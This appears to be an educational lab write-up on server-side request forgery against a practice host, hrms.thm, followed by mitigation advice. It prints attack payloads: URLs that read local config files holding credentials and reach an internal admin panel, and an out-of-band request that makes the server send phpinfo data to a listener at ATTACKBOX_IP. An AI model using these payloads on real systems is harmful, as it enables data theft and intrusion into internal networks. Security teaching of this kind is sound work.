# Server-Side Request Forgery (SSRF)

**Server-Side Request Forgery (SSRF)** is a web vulnerability where an attacker tricks a server into making requests on their behalf to internal or external resources.

Because the request originates from the **server itself**, attackers can sometimes access:

* Internal services
* Sensitive files
* Cloud metadata endpoints
* Restricted network resources

**Impact:**

* Data exposure
* Unauthorized access to internal systems
* Service disruption

---

## 1. Basic SSRF

**Basic SSRF** occurs when an application accepts a user-supplied URL and the server fetches the resource **without proper validation**.

An attacker can manipulate this input to make the server send requests to unintended destinations.

Common targets:

* Internal services
* Localhost
* Internal APIs
* Third-party services

### **Scenario 1: SSRF Against a Local Server**

In this attack, the attacker forces the application to make requests to the **same server (localhost)**.

This is often possible when a web application loads resources based on **user-supplied URL parameters**.

Example: `http://hrms.thm?url=localhost/copyright`

The application loads and displays content from the **local server**.

![img](/img/SSRF/1.png)

**Example Code:**

```php
$uri = rtrim($_GET['url'], "/");
...
$path = ROOTPATH . $file;
...
if (file_exists($path)) {
  echo "<pre>";
  echo htmlspecialchars(file_get_contents($path));
  echo "</pre>";
  } else { ?>
    <p class="text-xl"><?= ltrim($file, "/") ?> is not found</p>
 <?php
...
```

The vulnerability occurs because the application **does not properly validate the `url` parameter**. As a result, an attacker can manipulate this parameter to make the server load **arbitrary local files**, allowing access to sensitive local resources.

The key idea is that the attacker **forges a request that the server executes internally**.

### Exploitation

Normal request: `http://hrms.thm/?url=localhost/copyright`

Testing another resource: `http://hrms.thm/?url=localhost/hello`

Response: `hello.php is not found`

![img](/img/SSRF/2.png)

This reveals that the server attempts to load **PHP files from the local server**.

An attacker can then try accessing sensitive files: `http://hrms.thm/?url=localhost/config`

If the file exists, its contents are displayed.

![img](/img/SSRF/3.png)

This exposes **application credentials**.

### **Scenario 2: Accessing an Internal Server**

In complex web architectures, the **front-end application often communicates with internal back-end services** that are not directly accessible from the internet. These internal systems typically run on **private (non-routable) IP ranges**, such as `192.168.x.x` or `10.x.x.x`. Under normal circumstances, external users cannot interact with them. However, if a web application improperly validates user input, an attacker can exploit it to make the server send requests to these internal resources.

In an SSRF scenario, the attacker supplies a crafted URL that causes the vulnerable application to interact with **internal services on the same network**. If these internal services handle sensitive operations—such as database management or administrative interfaces—the attacker may gain unauthorized access or trigger unintended actions. This usually happens when the application passes user input directly into functions that perform **HTTP requests, file fetches, or API calls** without proper validation. Because the request originates from the server itself, the internal service trusts it as legitimate.

Another danger is that **internal systems often have weaker monitoring and logging** compared to public-facing servers. An attacker exploiting SSRF can quietly explore the internal network, discovering additional services and potential attack surfaces.

### How It Works

In this scenario, the attacker attempts to reach internal resources through the vulnerable web application.

After obtaining credentials from the previously exposed configuration file, the attacker logs into the HRMS dashboard. The interface displays employee information and contains a dropdown menu that loads additional data such as employee details or salaries.

![img](/img/SSRF/4.png)

The previously leaked configuration file reveals that the **admin panel is hosted internally** at: `http://192.168.2.10/admin.php`

Trying to access this URL directly from the browser fails because the IP belongs to a **private internal network**.

![img](/img/SSRF/5.png)

This means the resource is reachable only from systems inside the same network. However, inspecting the HTML source reveals that the dropdown fetches data from an internal endpoint. Employee information is loaded from: `http://192.168.2.10/employees.php`

> **Note:** The browser communicates with `details.php`, and this script sends the request to the internal server. The client never directly interacts with the internal network.

![img](/img/SSRF/6.png)

Since the application already retrieves data from the internal system, the attacker can attempt to **manipulate the request**. Instead of requesting the employee salary page, the attacker modifies the dropdown value to point to the admin panel.

Using **Inspect Element**, the attacker changes the value from `http://192.168.2.10/salary.php` to `http://192.168.2.10/admin.php`

![img](/img/SSRF/7.png)

After modifying the request, the attacker selects the **Salary** option from the dropdown menu.

![img](/img/SSRF/8.png)

The vulnerable application forwards the manipulated request to the internal server, and the response is returned to the user. As a result, the attacker gains access to the **internal admin panel**, which was previously unreachable from outside the network.

![img](/img/SSRF/9.png)

This demonstrates how SSRF can be used not only to access files on the local server but also to **pivot into internal infrastructure**, exposing administrative interfaces and sensitive internal services.

---

## 2. Blind SSRF with Out-of-Band (OOB)

**Blind SSRF** occurs when the attacker can trigger server-side requests but **cannot see the response directly**. To confirm exploitation, attackers use an **out-of-band (OOB) channel**, meaning the target server communicates with an external system controlled by the attacker. Instead of receiving the data through the vulnerable application, the attacker observes interactions such as **DNS lookups or HTTP requests** made to their own server. These interactions confirm that the server executed the forged request and may also leak useful information about the internal environment.

For example, an attacker might manipulate a vulnerable endpoint so that the server sends a request to a domain under their control. If the request arrives, the attacker knows the SSRF succeeded. In some cases, sensitive data may also be transmitted to the attacker’s server, such as system configuration details or internal network information.

**Consider the endpoint:**

```id="b2oh2s"
http://hrms.thm/profile.php?url=localhost/getInfo.php
```

When accessed, the page shows a message indicating that **data is being sent**.

![img](/img/SSRF/10.png)

Examining the source code reveals that the application reads the `url` parameter and sends information to that destination without validating it.

```php
<?php
...
$targetUrl = $_GET['url'];
ob_start();
phpinfo();
$phpInfoData = ob_get_clean();
$ch = curl_init($targetUrl); 
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,$phpInfoData);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch); 
...
?>
```

Here the application generates **PHP environment information** using `phpinfo()` and sends it via a POST request to the URL provided in the parameter. Because the input is not validated, an attacker can replace the destination with a server they control and receive this data directly.

To capture the data, the attacker sets up a simple HTTP listener. On the AttackBox, create a file named `server.py` with the following code:

```py
from http.server import SimpleHTTPRequestHandler, HTTPServer
from urllib.parse import unquote
class CustomRequestHandler(SimpleHTTPRequestHandler):

    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        super().end_headers()

    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Hello, GET request!')

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')

        self.send_response(200)
        self.end_headers()

        with open('data.html', 'a') as file:
            file.write(post_data + '\n')

        response = f'THM, POST request! Received data: {post_data}'
        self.wfile.write(response.encode('utf-8'))

if __name__ == '__main__':
    server_address = ('', 8080)
    httpd = HTTPServer(server_address, CustomRequestHandler)
    print('Server running on http://localhost:8080/')
    httpd.serve_forever()
```

This script runs a lightweight HTTP server that **logs incoming POST data to `data.html`**. Start the server using:

```id="p8f1sx"
sudo python3 server.py
```

Next, trigger the SSRF by sending the request:

```id="hdv4ie"
http://hrms.thm/profile.php?url=http://ATTACKBOX_IP:8080
```

The vulnerable server sends the collected information to the attacker-controlled server, where it is stored in `data.html`.

![img](/img/SSRF/11.png)

Opening this file reveals detailed **PHP environment information**, which may include server configuration details useful for further exploitation.

### Semi-Blind SSRF (Time-Based)

**Time-based SSRF** is a variant where attackers infer success by observing **response delays** instead of direct data or out-of-band communication. The attacker sends requests targeting different internal resources and measures the response time. If a request takes noticeably longer to return, it may indicate that the server attempted to access the specified resource. By repeating this process with multiple targets, attackers can gradually map internal services and confirm the presence of SSRF even when no visible output is returned.

---

## 3. A Classic Example – Crashing the Server

SSRF is not limited to data access; it can also be abused to **disrupt service availability**. In some cases, attackers exploit SSRF to force the server into processing heavy or malicious requests that consume excessive resources, eventually leading to a **Denial of Service (DoS)**. Real-world incidents in platforms like WordPress and CairoSVG have shown how SSRF vulnerabilities can be leveraged to degrade or crash systems.

In this scenario, the attacker exploits an application feature that loads external resources. By providing a specially crafted URL pointing to a resource that consumes large amounts of memory or bandwidth, the attacker can force the server to exhaust its resources and potentially crash.

For example, an attacker might supply a URL referencing a **very large file** or a resource hosted on a slow server that continuously streams data. When the vulnerable application attempts to retrieve and process this content, it may consume excessive memory or processing power, eventually destabilizing the application.

**How it Works:**

After logging into the dashboard, the attacker notices a **Training** tab in the navigation bar that loads training content for employees. Clicking the tab redirects the browser to the following URL:

```text
http://hrms.thm/url.php?id=192.168.2.10/trainingbanner.jpg
```

The page loads training content from an internal server.

![img](/img/SSRF/12.png)

Observation shows that `url.php` fetches and displays external resources. If the application is vulnerable to SSRF, it may allow attackers to request **any resource accessible to the server**.

Testing another resource:

```text
http://hrms.thm/url.php?id=192.168.2.10/fast.txt
```

Since earlier tests confirmed the presence of SSRF, the attacker investigates the source code of `url.php`. Accessing:

```text
http://hrms.thm/?url=localhost/url
```

reveals the following code snippet in the page footer (this works only when the user is logged out):

```php
<?php
....
....
if ($imageSize < 100) {
    // Output the image if it's within the size limit

    $base64Image = downloadAndEncodeImage($imageUrl);
    echo '<img src="' . htmlspecialchars($base64Image) . '" alt="Image" style="width: 100%; height: 100%; object-fit: cover;">';

} else {
    // Memory Outage - server will crash
....
...
```

The code shows that the application attempts to **download and display an image**, but only if its size is less than **100 KB**. If the image exceeds this size, the application encounters a **memory error**, which can destabilize or crash the server.

An attacker can exploit this behavior by forcing the application to retrieve a large file. For example:

```text
http://hrms.thm/url.php?id=192.168.2.10/bigImage.jpg
```

When the server attempts to fetch and process this large image, it exceeds the intended memory limit, causing an error and potentially crashing the service.

![img](/img/SSRF/13.png)

This example demonstrates that SSRF vulnerabilities are not limited to data exposure. By manipulating how a server fetches external resources, attackers can also **exhaust system resources and disrupt application availability**, turning a simple input validation flaw into a denial-of-service vector.

---

## 4. Remedial Measures

Mitigating **Server-Side Request Forgery (SSRF)** is essential for protecting web applications and internal infrastructure. Since SSRF allows attackers to force a server to make unintended requests, proper defensive measures must ensure that user input cannot be abused to interact with sensitive resources. Strong mitigation strategies reduce the risk of internal data exposure, unauthorized access to internal services, and denial-of-service scenarios. Implementing these controls strengthens the application's overall security posture and helps prevent data breaches.

Key mitigation practices include:

* **Strict input validation and sanitisation:** All user-supplied inputs—especially URLs or parameters used for external requests—must be properly validated and sanitised to prevent malicious values from being processed by the server.

* **Allowlisting trusted destinations:** Instead of attempting to block malicious URLs through blocklists (which are often bypassed), maintain a strict **allowlist of trusted domains or endpoints** that the application is permitted to contact.

* **Network segmentation:** Internal services should be isolated from public-facing systems. Even if SSRF occurs, segmentation prevents the compromised application from freely interacting with sensitive internal resources.

* **Security policies and headers:** Implement mechanisms such as **Content Security Policy (CSP)** to control which external resources can be loaded and reduce the risk of unintended external interactions.

* **Strong access control:** Internal APIs, administrative panels, and databases should enforce authentication and authorization. Even if an SSRF request reaches these services, attackers should not gain access without proper credentials.

* **Logging and monitoring:** Maintain detailed logs of outgoing requests and implement monitoring systems that detect abnormal or suspicious activity. Alerts for unusual traffic patterns can help detect SSRF exploitation attempts early.

Effective SSRF defense usually requires **multiple layers of protection**, combining input validation, network controls, and monitoring to prevent attackers from abusing server-side request functionality.

---
